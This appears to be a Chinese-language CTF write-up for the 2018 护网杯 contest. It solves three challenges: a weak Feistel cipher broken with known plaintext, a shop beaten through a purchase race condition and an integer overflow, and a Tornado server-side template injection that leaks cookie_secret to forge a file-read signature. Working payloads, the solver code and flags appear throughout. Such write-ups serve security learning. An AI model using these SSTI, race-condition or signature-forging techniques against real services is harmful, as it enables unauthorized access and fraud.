---
title: 护网杯解题记录
date: 2018-10-14 00:17:37
---

![1539436751699](1539436751699.png)
# FEZ

```python
import os
def xor(a,b):
    assert len(a)==len(b)
    c=""
    for i in range(len(a)):
        c+=chr(ord(a[i])^ord(b[i]))
    return c
def f(x,k):
    return xor(xor(x,k),7)
def round(M,K):
    L=M[0:27]
    R=M[27:54]
    new_l=R
    new_r=xor(xor(R,L),K)
    return new_l+new_r
def fez(m,K):
    for i in K:
        m=round(m,i)
    return m

K=[]
for i in range(7):
    K.append(os.urandom(27))
m=open("flag","rb").read()
assert len(m)<54
m+=os.urandom(54-len(m))

test=os.urandom(54)
print test.encode("hex")
print fez(test,K).encode("hex")
print fez(m,K).encode("hex")
```

假设最后一轮结束后高低字节分别为l,r，可逐轮逆推出上一轮的值，从而得到明文和密文的关系。由已知的一组test明文密文对，可得到flag的明文。

| round | left                         | right                 |
| ----- | ---------------------------- | --------------------- |
| 0     | l^r^k[0]^k[1]^k[3]^k[4]^k[6] | l^k[1]^k[2]^k[4]^k[5] |
| 1     | l^k[1]^k[2]^k[4]^k[5]        | r^k[2]^k[3]^k[5]^k[6] |
| 2     | r^k[2]^k[3]^k[5]^k[6]        | l^r*k[3]^k[4]^k[6]    |
| 3     | l^r*k[3]^k[4]^k[6]           | l^k[4]^k[5]           |
| 4     | l^k[4]^k[5]                  | r^k[5]^k[6]           |
| 5     | r^k[5]^k[6]                  | r^l^k[6]              |
| 6     | r^l^k[6]                     | l                     |
| 7     | l                            | r                     |

```python
# -*- coding: utf-8 -*-
# __author__ = findneo

def xor(a,b):
    assert len(a)==len(b)
    c=""
    for i in range(len(a)):
        c+=chr(ord(a[i])^ord(b[i]))
    return c
all_xor = lambda x:reduce(xor,x)
test_plain="c8b84d08e5a8e60a49578f387fff5a90e9e7c181734bf05be4f5403c9ea24a0b8741a329991637e11fa69019cd3b01d7c95b65f5abd5"
test_cipher="5c3660c27cb9b3785a5ce06022e88bc831017e882d39475ea85d919ad9e5ac498f86c553216cab1f8f7468353d46ba8971efa9ca8c81"
flag_cipher="519ab6fc0e435da00516b844f8fe664bfe9445992f478dc650701739a11ffda5bbeb643159d7e8cd03a2104c798a1ca734b905ee6c76"

p=test_plain.decode("hex")
c=test_cipher.decode("hex")
f=flag_cipher.decode("hex")

l,r=c[0:27],c[27:54]
pl,pr=p[0:27],p[27:54]
fl,fr=f[0:27],f[27:54]
fcl=all_xor([l,r,pl,fl,fr])
fcr=all_xor([l,pr,fl])
flag=fcl+fcr
print flag
#flag{festel_weak_666_plo88112tty}
```

# LTSHOP

使用burp的intruder竞争买大辣条，得到超过五个大辣条。

![1539428933786](1539428933786.png)

然后买 `2**64/5+1` 个辣条王，使得需要付的大辣条多到uint装不下，向上溢出为负数，我们就买得起很多的辣条王了，实现一夜暴富。

![1539429086591](1539429086591.png)

然后flag就随便买了。

![1539429113491](1539429113491.png)

![1539437436657](1539437436657.png)

# easy_tornado

有三个提示：

```html
http://49.4.78.9:31465/file?filename=flag.txt&signature=95660d430a8ad05fc7337d12e6a08b1a
render()
md5(cookie_secret + md5(filename))
/fllllllllllag
```

报错页面存在SSTI。

```html
访问 `http://49.4.78.9:31465/error?msg={{handler.settings}}`得到配置信息。
Whoops, looks like somethings went wrong . 
{'login_url': '/login', 'template_path': 'templates', 'xsrf_cookies': True, 'cookie_secret': 'pGD*~9Y]N?>5zBvS_3768U+O}<#^k@oM$grqZQ4!yK1ucVnijmRJlFwI%hP(0exE', 'debug': False, 'file_path': '/www/static/files', 'static_path': 'static'}
```

得到cookie_secret，即可构造签名读取flag。

```bash
abc@xyz:~$ curl "http://49.4.78.9:31465/file?filename=/fllllllllllag&signature=8f270fa794962fa2ec4e63e6b03a830b" -s | grep flag
flag{59a95928373bfa789e06635d2d5e9459}
```

参考：https://www.cnblogs.com/bwangel23/p/4858870.html 

# 更多题解

- [护网杯2018线上赛 Writeup by Whitzard](https://xz.aliyun.com/t/2893) 
- [2018护网杯线上赛 Writeup by 天枢](https://xz.aliyun.com/t/2897) 
- [2018护网杯线上赛题解by Lilac](https://xz.aliyun.com/t/2892) 
- [护网杯-easy laravel-Writeup](http://www.venenof.com/index.php/archives/565/) 
- [2018护网杯-web-writeup](http://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/) 